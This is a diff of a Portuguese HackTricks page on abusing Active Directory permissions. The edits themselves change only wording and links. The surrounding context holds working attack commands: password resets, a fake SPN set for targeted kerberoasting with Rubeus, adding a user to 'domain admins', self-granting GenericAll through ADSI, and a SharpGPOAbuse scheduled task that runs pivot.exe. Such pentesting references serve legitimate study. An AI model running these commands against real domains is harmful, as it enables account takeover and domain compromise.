@@ -9,8 +9,8 @@ Outras formas de apoiar o HackTricks:
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
@@ -28,7 +28,7 @@ Encontre vulnerabilidades que mais importam para que você possa corrigi-las mai
 Este privilégio concede a um atacante controle total sobre a conta de usuário de destino. Uma vez que os direitos `GenericAll` são confirmados usando o comando `Get-ObjectAcl`, um atacante pode:
 
 - **Alterar a Senha do Alvo**: Usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
-- **Kerberoasting Direcionado**: Atribuir um SPN à conta do usuário para torná-la kerberoastable, em seguida, usar o Rubeus e targetedKerberoast.py para extrair e tentar quebrar os hashes do ticket-granting ticket (TGT).
+- **Kerberoasting Direcionado**: Atribuir um SPN à conta do usuário para torná-la kerberoastable, em seguida, usar o Rubeus e o targetedKerberoast.py para extrair e tentar quebrar os hashes do ticket-granting ticket (TGT).
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
@@ -50,7 +50,7 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 ## **GenericAll / GenericWrite / Write on Computer/User**
 Ter esses privilégios em um objeto de computador ou em uma conta de usuário permite:
 
-- **Delegação Restrita Baseada em Recursos do Kerberos**: Permite assumir o controle de um objeto de computador.
+- **Delegação Restrita Baseada em Recurso do Kerberos**: Permite assumir o controle de um objeto de computador.
 - **Credenciais de Sombra**: Use essa técnica para se passar por um computador ou conta de usuário explorando os privilégios para criar credenciais de sombra.
 
 ## **WriteProperty on Group**
@@ -61,7 +61,7 @@ Se um usuário tiver direitos de `WriteProperty` em todos os objetos de um grupo
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **Autoassociação (Autoassociação de Membros) em Grupo**
-Esse privilégio permite que atacantes se adicionem a grupos específicos, como `Administradores de Domínio`, por meio de comandos que manipulam diretamente a associação de grupos. Usar a sequência de comandos a seguir permite a autoadição:
+Esse privilégio permite que os atacantes se adicionem a grupos específicos, como `Administradores de Domínio`, por meio de comandos que manipulam diretamente a associação de grupos. Usar a sequência de comandos a seguir permite a autoadição:
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -105,7 +105,7 @@ Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
 ## **WriteDACL + WriteOwner**
-Possuir um objeto AD e ter privilégios de `WriteDACL` nele permite a um atacante conceder a si mesmo privilégios `GenericAll` sobre o objeto. Isso é feito por meio da manipulação do ADSI, permitindo o controle total sobre o objeto e a capacidade de modificar suas associações de grupo. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo Active Directory.
+Possuir um objeto AD e ter privilégios de `WriteDACL` sobre ele permite a um atacante conceder a si mesmo privilégios `GenericAll` sobre o objeto. Isso é feito por meio da manipulação do ADSI, permitindo o controle total sobre o objeto e a capacidade de modificar suas associações de grupo. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo Active Directory.
 ```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -139,7 +139,7 @@ Para identificar GPOs mal configurados, os cmdlets do PowerSploit podem ser enca
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-**Computadores com uma Política Específica Aplicada**: É possível determinar quais computadores uma GPO específica se aplica, ajudando a entender o escopo do impacto potencial.
+**Computadores com uma Política Específica Aplicada**: É possível determinar quais computadores uma GPO específica se aplica, ajudando a entender o alcance do impacto potencial.
 ```powershell
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
@@ -167,9 +167,9 @@ SharpGPOAbuse oferece um método para abusar de GPOs existentes adicionando tare
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
-### Forçar a Atualização da Política
+### Forçar a Atualização de Política
 
-As atualizações de GPO geralmente ocorrem a cada 90 minutos. Para acelerar esse processo, especialmente após implementar uma alteração, o comando `gpupdate /force` pode ser usado no computador alvo para forçar uma atualização imediata da política. Esse comando garante que quaisquer modificações nas GPOs sejam aplicadas sem esperar pelo próximo ciclo de atualização automática.
+As atualizações de GPO geralmente ocorrem a cada 90 minutos. Para acelerar esse processo, especialmente após a implementação de uma alteração, o comando `gpupdate /force` pode ser usado no computador alvo para forçar uma atualização imediata da política. Esse comando garante que quaisquer modificações nas GPOs sejam aplicadas sem esperar pelo próximo ciclo de atualização automática.
 
 ### Por Dentro
 
@@ -179,11 +179,11 @@ A estrutura da tarefa, conforme mostrado no arquivo de configuração XML gerado
 
 ### Usuários e Grupos
 
-As GPOs também permitem a manipulação de membros de usuários e grupos em sistemas alvo. Ao editar diretamente os arquivos de política de Usuários e Grupos, os atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administradores`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite a modificação dos arquivos de política para incluir novos usuários ou alterar membros de grupos.
+As GPOs também permitem a manipulação de membros de usuários e grupos em sistemas alvo. Ao editar os arquivos de política de Usuários e Grupos diretamente, os atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administradores`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite a modificação dos arquivos de política para incluir novos usuários ou alterar pertencimentos a grupos.
 
 O arquivo de configuração XML para Usuários e Grupos detalha como essas alterações são implementadas. Ao adicionar entradas a este arquivo, usuários específicos podem receber privilégios elevados em sistemas afetados. Este método oferece uma abordagem direta para escalonamento de privilégios por meio da manipulação de GPOs.
 
-Além disso, outros métodos para executar código ou manter persistência, como aproveitar scripts de logon/logoff, modificar chaves de registro para autoruns, instalar software via arquivos .msi ou editar configurações de serviço, também podem ser considerados. Essas técnicas oferecem várias formas de manter o acesso e controlar sistemas alvo por meio do abuso de GPOs.
+Além disso, outros métodos para executar código ou manter persistência, como alavancar scripts de logon/logoff, modificar chaves de registro para autoruns, instalar software via arquivos .msi ou editar configurações de serviço, também podem ser considerados. Essas técnicas fornecem várias maneiras de manter o acesso e controlar sistemas alvo por meio do abuso de GPOs.
 
 
 
@@ -213,7 +213,7 @@ Outras maneiras de apoiar o HackTricks:
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
